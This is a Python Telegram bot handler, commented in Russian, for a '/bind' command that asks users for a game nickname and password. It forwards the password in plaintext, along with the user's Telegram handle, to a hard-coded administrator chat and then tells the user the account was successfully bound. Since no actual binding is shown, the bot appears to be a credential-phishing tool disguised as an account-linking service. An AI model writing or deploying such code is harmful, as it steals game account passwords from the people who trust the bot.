@dp.message(Command("bind"))
async def bind_handler(message: types.Message):
    user_id = message.from_user.id
    current_time = time.time()
    
    # Проверка кулдауна
    if user_id in user_cooldowns:
        elapsed = current_time - user_cooldowns[user_id]
        if elapsed < 15:
            remaining = int(15 - elapsed)
            
            # Отправляем сообщение-таймер
            msg = await message.answer(f"⚠️ Подождите {remaining} сек. перед следующей попыткой.")
            
            # Цикл обратного отсчета
            for i in range(remaining, 0, -1):
                await asyncio.sleep(1)
                try:
                    await msg.edit_text(f"⚠️ Подождите {i} сек. перед следующей попыткой.")
                except:
                    break # Если пользователь удалил сообщение сам, выходим из цикла
            
            # Удаляем сообщение после окончания таймера
            try:
                await msg.delete()
            except:
                pass
            return

    # Обновляем время попытки
    user_cooldowns[user_id] = current_time

    args = message.text.split()
    if len(args) < 3:
        await message.answer("[Бот] Неверный формат! Используйте: /bind [Ник] [Пароль]")
        return
        
    username = args[1]
    password = " ".join(args[2:])
    
    # Отправка тебе (Админу)
    tg_user = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    admin_msg = f"🎮 **Новая привязка**\n👤 Игрок: {tg_user}\n🏷 Ник: `{username}`\n🔑 Пароль: `{password}`"
    
    try:
        await bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown")
        await message.answer("[Бот] Аккаунт был успешно привязан!")
    except Exception as e:
        await message.answer("[Бот] Ошибка при отправке данных администратору.")
        print(f"Ошибка: {e}")

